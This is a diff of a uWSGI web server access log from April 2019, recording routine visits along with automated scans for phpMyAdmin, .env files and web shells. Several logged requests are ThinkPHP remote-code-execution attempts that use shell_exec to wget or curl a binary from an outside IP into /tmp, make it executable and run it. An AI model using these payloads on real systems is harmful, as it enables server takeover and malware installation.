@@ -1,100 +1,44 @@
 
-[pid: 19832|app: 0|req: 1100/1718] 58.251.121.184 () {38 vars in 638 bytes} [Fri Apr 19 16:06:58 2019] GET /manager/html => generated 1121 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1101/1719] 163.177.90.152 () {38 vars in 626 bytes} [Fri Apr 19 16:06:58 2019] GET /ok.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1102/1720] 59.36.119.227 () {38 vars in 635 bytes} [Fri Apr 19 16:16:09 2019] GET /general.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1103/1721] 77.159.72.160 () {32 vars in 452 bytes} [Fri Apr 19 16:19:01 2019] GET / => generated 12678 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1104/1722] 101.226.102.70 () {38 vars in 628 bytes} [Fri Apr 19 16:24:07 2019] GET /hhh.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19833|app: 0|req: 239/1723] 101.226.102.70 () {38 vars in 630 bytes} [Fri Apr 19 16:24:07 2019] GET /lost.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19833|app: 0|req: 240/1724] 58.251.121.186 () {38 vars in 630 bytes} [Fri Apr 19 16:25:11 2019] GET /core.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19831|app: 0|req: 205/1725] 59.36.119.226 () {38 vars in 625 bytes} [Fri Apr 19 16:25:11 2019] GET /qq.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19831|app: 0|req: 206/1726] 14.17.21.58 () {38 vars in 693 bytes} [Fri Apr 19 16:25:12 2019] GET /w00tw00t.at.blackhats.romanian.anti-sec:) => generated 1121 bytes in 44 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1105/1727] 59.36.119.227 () {38 vars in 627 bytes} [Fri Apr 19 16:26:43 2019] GET /cmv.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1106/1728] 59.36.119.227 () {38 vars in 653 bytes} [Fri Apr 19 16:27:02 2019] GET /phpMyAdm1n/index.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1107/1729] 163.177.90.152 () {38 vars in 628 bytes} [Fri Apr 19 16:27:03 2019] GET /lol.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1108/1730] 58.251.121.186 () {38 vars in 630 bytes} [Fri Apr 19 16:34:13 2019] GET /erwa.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1109/1731] 14.17.21.58 () {38 vars in 653 bytes} [Fri Apr 19 16:34:14 2019] GET /phpMyAdmins/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1110/1732] 101.226.114.193 () {38 vars in 639 bytes} [Fri Apr 19 16:34:40 2019] GET /db/index.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1111/1733] 58.251.121.184 () {38 vars in 628 bytes} [Fri Apr 19 16:39:20 2019] GET /diy.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1112/1734] 14.17.3.64 () {38 vars in 630 bytes} [Fri Apr 19 16:39:21 2019] GET /paylog.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1113/1735] 58.251.121.184 () {38 vars in 662 bytes} [Fri Apr 19 16:45:16 2019] GET /web/phpMyAdmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19833|app: 0|req: 241/1736] 59.36.119.226 () {38 vars in 627 bytes} [Fri Apr 19 16:45:16 2019] GET /xw1.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1114/1737] 101.91.62.11 () {38 vars in 628 bytes} [Fri Apr 19 16:45:17 2019] GET /toor.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1115/1738] 58.251.121.185 () {38 vars in 636 bytes} [Fri Apr 19 16:45:32 2019] GET /muhstik.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19833|app: 0|req: 242/1739] 58.251.121.185 () {38 vars in 626 bytes} [Fri Apr 19 16:45:32 2019] GET /uu.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19831|app: 0|req: 207/1740] 59.36.119.227 () {38 vars in 633 bytes} [Fri Apr 19 16:45:32 2019] GET /xiaoxi.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19831|app: 0|req: 208/1741] 59.36.119.226 () {38 vars in 635 bytes} [Fri Apr 19 16:45:40 2019] GET /db.init.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19833|app: 0|req: 243/1742] 101.226.102.70 () {38 vars in 630 bytes} [Fri Apr 19 16:46:47 2019] GET /neko.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1116/1743] 14.17.21.58 () {38 vars in 623 bytes} [Fri Apr 19 16:48:07 2019] GET /bx.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19833|app: 0|req: 244/1744] 14.17.21.58 () {38 vars in 627 bytes} [Fri Apr 19 16:48:07 2019] GET /hue2.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19831|app: 0|req: 209/1745] 59.36.119.226 () {38 vars in 625 bytes} [Fri Apr 19 16:48:07 2019] GET /up.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1117/1746] 59.36.119.226 () {38 vars in 655 bytes} [Fri Apr 19 16:50:20 2019] GET /phpmyadmin2/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19831|app: 0|req: 210/1747] 14.17.21.58 () {38 vars in 631 bytes} [Fri Apr 19 16:55:22 2019] GET /python.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1118/1748] 58.251.121.184 () {38 vars in 630 bytes} [Fri Apr 19 16:56:23 2019] GET /ak48.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1119/1749] 14.17.3.64 () {38 vars in 622 bytes} [Fri Apr 19 16:56:24 2019] GET /xw.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1120/1750] 185.254.122.34 () {34 vars in 383 bytes} [Fri Apr 19 17:01:48 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1121/1751] 58.251.121.186 () {38 vars in 632 bytes} [Fri Apr 19 17:15:28 2019] GET /index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1122/1752] 169.197.108.50 () {34 vars in 477 bytes} [Fri Apr 19 18:02:51 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1123/1753] 188.166.115.117 () {34 vars in 469 bytes} [Fri Apr 19 18:45:41 2019] GET /wp-login.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1124/1754] 181.228.93.146 () {32 vars in 454 bytes} [Fri Apr 19 19:08:56 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1125/1755] 43.230.11.178 () {40 vars in 632 bytes} [Fri Apr 19 19:15:24 2019] GET /upload/bank-icons/bank-gh.jpg => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19833|app: 0|req: 245/1756] 43.230.11.178 () {40 vars in 632 bytes} [Fri Apr 19 19:15:24 2019] GET /upload/bank-icons/bank_16.png => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1126/1757] 196.250.218.125 () {32 vars in 455 bytes} [Fri Apr 19 19:39:15 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1127/1758] 80.82.70.187 () {32 vars in 421 bytes} [Fri Apr 19 20:08:34 2019] GET /cache/global/img/gs.gif => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1128/1759] 176.23.133.152 () {32 vars in 520 bytes} [Fri Apr 19 20:47:11 2019] GET /mysql/admin/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1129/1760] 176.23.133.152 () {32 vars in 524 bytes} [Fri Apr 19 20:47:12 2019] GET /mysql/dbadmin/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1130/1761] 176.23.133.152 () {32 vars in 530 bytes} [Fri Apr 19 20:47:12 2019] GET /mysql/sqlmanager/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1131/1762] 176.23.133.152 () {32 vars in 534 bytes} [Fri Apr 19 20:47:14 2019] GET /mysql/mysqlmanager/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1132/1763] 176.23.133.152 () {32 vars in 518 bytes} [Fri Apr 19 20:47:14 2019] GET /phpmyadmin/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1133/1764] 176.23.133.152 () {32 vars in 518 bytes} [Fri Apr 19 20:47:16 2019] GET /phpMyadmin/index.php?lang=en => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1134/1765] 176.23.133.152 () {32 vars in 518 bytes} [Fri Apr 19 20:47:17 2019] GET /phpMyAdmin/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1135/1766] 176.23.133.152 () {32 vars in 518 bytes} [Fri Apr 19 20:47:18 2019] GET /phpmyAdmin/index.php?lang=en => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1136/1767] 176.23.133.152 () {32 vars in 520 bytes} [Fri Apr 19 20:47:18 2019] GET /phpmyadmin2/index.php?lang=en => generated 1121 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1137/1768] 176.23.133.152 () {32 vars in 520 bytes} [Fri Apr 19 20:47:19 2019] GET /phpmyadmin3/index.php?lang=en => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1138/1769] 176.23.133.152 () {32 vars in 520 bytes} [Fri Apr 19 20:47:19 2019] GET /phpmyadmin4/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1139/1770] 176.23.133.152 () {32 vars in 520 bytes} [Fri Apr 19 20:47:20 2019] GET /2phpmyadmin/index.php?lang=en => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1140/1771] 176.23.133.152 () {32 vars in 596 bytes} [Fri Apr 19 20:47:20 2019] GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1141/1772] 176.23.133.152 () {32 vars in 508 bytes} [Fri Apr 19 20:47:21 2019] GET /phpmy/index.php?lang=en => generated 1121 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1142/1773] 176.23.133.152 () {32 vars in 510 bytes} [Fri Apr 19 20:47:21 2019] GET /phppma/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1143/1774] 176.23.133.152 () {32 vars in 512 bytes} [Fri Apr 19 20:47:22 2019] GET /myadmin/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1144/1775] 176.23.133.152 () {32 vars in 510 bytes} [Fri Apr 19 20:47:22 2019] GET /shopdb/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1145/1776] 176.23.133.152 () {32 vars in 512 bytes} [Fri Apr 19 20:47:23 2019] GET /MyAdmin/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1146/1777] 176.23.133.152 () {32 vars in 512 bytes} [Fri Apr 19 20:47:23 2019] GET /program/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1147/1778] 176.23.133.152 () {32 vars in 504 bytes} [Fri Apr 19 20:47:24 2019] GET /PMA/index.php?lang=en => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1148/1779] 58.251.121.185 () {38 vars in 628 bytes} [Fri Apr 19 21:02:50 2019] GET /hhh.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1149/1780] 88.217.80.50 () {32 vars in 518 bytes} [Fri Apr 19 21:22:18 2019] GET /mysql/admin/index.php?lang=en => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1150/1781] 178.62.232.43 () {38 vars in 509 bytes} [Fri Apr 19 21:38:26 2019] GET /w00tw00t.at.blackhats.romanian.anti-sec:) => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19833|app: 0|req: 246/1782] 178.62.232.43 () {38 vars in 483 bytes} [Fri Apr 19 21:38:26 2019] GET /phpMyAdmin/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1151/1783] 178.62.232.43 () {38 vars in 483 bytes} [Fri Apr 19 21:38:26 2019] GET /phpmyadmin/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19833|app: 0|req: 247/1784] 178.62.232.43 () {38 vars in 469 bytes} [Fri Apr 19 21:38:27 2019] GET /pma/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1152/1785] 178.62.232.43 () {38 vars in 473 bytes} [Fri Apr 19 21:38:27 2019] GET /phpmy/scripts/setup.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1153/1786] 174.138.55.18 () {36 vars in 910 bytes} [Fri Apr 19 22:00:53 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://45.234.95.188/x86_64;cat%20x86_64%20%3E%20xdsf;chmod%20777%20xdsf;./xdsf%20thinkphp => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1154/1787] 174.138.55.18 () {36 vars in 920 bytes} [Fri Apr 19 22:00:53 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;curl%20-O%20http://45.234.95.188/x86_64;cat%20x86_64%20%3E%20xdsf;chmod%20777%20xdsf;./xdsf%20thinkphp => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1155/1788] 58.251.121.185 () {38 vars in 614 bytes} [Fri Apr 19 22:17:19 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1156/1789] 51.158.112.186 () {30 vars in 333 bytes} [Fri Apr 19 22:45:28 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1157/1790] 59.36.119.226 () {38 vars in 674 bytes} [Fri Apr 19 23:48:21 2019] GET /phpmyadmin2/index.php?lang%3Den => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1158/1791] 202.158.76.58 () {32 vars in 452 bytes} [Fri Apr 19 23:53:14 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1159/1792] 14.17.21.58 () {38 vars in 672 bytes} [Sat Apr 20 00:18:37 2019] GET /phpmyadmin3/index.php?lang%3Den => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1160/1793] 58.251.121.185 () {38 vars in 656 bytes} [Sat Apr 20 01:34:32 2019] GET /pma/scripts/setup.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1161/1794] 60.191.52.254 () {36 vars in 572 bytes} [Sat Apr 20 02:49:17 2019] HEAD / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1162/1795] 52.36.85.5 () {32 vars in 349 bytes} [Sat Apr 20 02:57:17 2019] GET /.env => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1163/1796] 187.35.17.199 () {32 vars in 452 bytes} [Sat Apr 20 03:08:51 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1164/1797] 87.9.55.2 () {32 vars in 449 bytes} [Sat Apr 20 03:22:51 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1165/1798] 188.191.108.234 () {32 vars in 454 bytes} [Sat Apr 20 03:45:47 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1166/1799] 119.93.41.9 () {32 vars in 451 bytes} [Sat Apr 20 03:50:51 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1167/1800] 173.235.92.138 () {32 vars in 453 bytes} [Sat Apr 20 04:00:25 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1168/1801] 36.84.58.108 () {32 vars in 451 bytes} [Sat Apr 20 04:32:48 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1169/1802] 171.80.26.84 () {40 vars in 586 bytes} [Sat Apr 20 04:40:52 2019] GET /index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19831|app: 0|req: 211/1803] 171.80.26.84 () {38 vars in 579 bytes} [Sat Apr 20 04:40:53 2019] GET /phpmyadmin/index.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1170/1804] 171.80.26.84 () {38 vars in 719 bytes} [Sat Apr 20 04:41:01 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1171/1805] 18.222.113.127 () {32 vars in 369 bytes} [Sat Apr 20 04:56:32 2019] GET /.env.example => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1172/1806] 112.64.199.58 () {30 vars in 309 bytes} [Sat Apr 20 05:15:53 2019] GET / => generated 1127 bytes in 153 msecs (HTTP/1.0 400) 1 headers in 68 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1173/1807] 124.160.57.70 () {42 vars in 812 bytes} [Sat Apr 20 06:13:48 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-180====9
-{'title': '食疗补血 推荐几款补血食疗方', 'abstract': '我们常常会听到人说红润有光泽、白里透红等等描述脸色的说法，这些表示人体造血正常，也没有缺血的情况，而脸色蜡黄、暗沉等等则表示人体有贫血症状。', 'url': 'https://ys.99.com.cn/diaoyang/492852.htm'}
-[pid: 19832|app: 0|req: 1174/1808] 124.160.57.70 () {44 vars in 878 bytes} [Sat Apr 20 06:13:50 2019] GET /views/console/ => generated 13479 bytes in 1166 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1175/1809] 124.160.57.70 () {44 vars in 880 bytes} [Sat Apr 20 06:14:13 2019] GET /views/consoles/ => generated 10995 bytes in 1193 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1176/1810] 80.82.70.187 () {32 vars in 421 bytes} [Sat Apr 20 06:14:26 2019] GET /cache/global/img/gs.gif => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1177/1811] 124.160.57.70 () {44 vars in 886 bytes} [Sat Apr 20 06:14:28 2019] GET /views/distinguish/ => generated 4075 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 13/13] 185.83.181.66 () {38 vars in 598 bytes} [Sun Apr 21 16:12:55 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 14/14] 185.83.181.66 () {38 vars in 599 bytes} [Sun Apr 21 16:12:57 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 15/15] 185.83.181.66 () {38 vars in 598 bytes} [Sun Apr 21 16:13:02 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 16/16] 41.60.233.79 () {32 vars in 452 bytes} [Sun Apr 21 17:01:27 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 17/17] 154.48.227.35 () {40 vars in 632 bytes} [Sun Apr 21 17:19:22 2019] GET /upload/bank-icons/bank-gh.jpg => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 18/18] 154.48.227.35 () {40 vars in 632 bytes} [Sun Apr 21 17:19:22 2019] GET /upload/bank-icons/bank_16.png => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 19/19] 185.198.0.168 () {32 vars in 452 bytes} [Sun Apr 21 18:13:39 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 20/20] 185.244.25.224 () {36 vars in 1005 bytes} [Sun Apr 21 18:24:22 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.244.25.145/Demon.x86%20;chmod%20777%20*%20Demon.x86;%20cat%20Demon.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 21/21] 138.204.133.8 () {32 vars in 452 bytes} [Sun Apr 21 18:57:39 2019] GET / => generated 12678 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 22/22] 103.23.237.255 () {32 vars in 460 bytes} [Sun Apr 21 19:00:21 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 23/23] 124.248.177.47 () {32 vars in 453 bytes} [Sun Apr 21 19:02:29 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 24/24] 196.2.14.184 () {32 vars in 451 bytes} [Sun Apr 21 19:03:48 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 25/25] 178.73.215.171 () {28 vars in 288 bytes} [Sun Apr 21 20:10:39 2019] GET / => generated 1127 bytes in 80 msecs (HTTP/1.0 400) 1 headers in 68 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 26/26] 185.244.25.224 () {36 vars in 1005 bytes} [Sun Apr 21 21:12:57 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.244.25.145/Demon.x86%20;chmod%20777%20*%20Demon.x86;%20cat%20Demon.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 27/27] 81.163.48.131 () {32 vars in 452 bytes} [Sun Apr 21 21:49:11 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 28/28] 80.82.70.187 () {32 vars in 421 bytes} [Sun Apr 21 22:48:10 2019] GET /cache/global/img/gs.gif => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 29/29] 91.140.113.123 () {32 vars in 453 bytes} [Sun Apr 21 22:56:56 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 30/30] 142.93.9.47 () {38 vars in 507 bytes} [Mon Apr 22 01:43:15 2019] GET /w00tw00t.at.blackhats.romanian.anti-sec:) => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+数据库已存在！
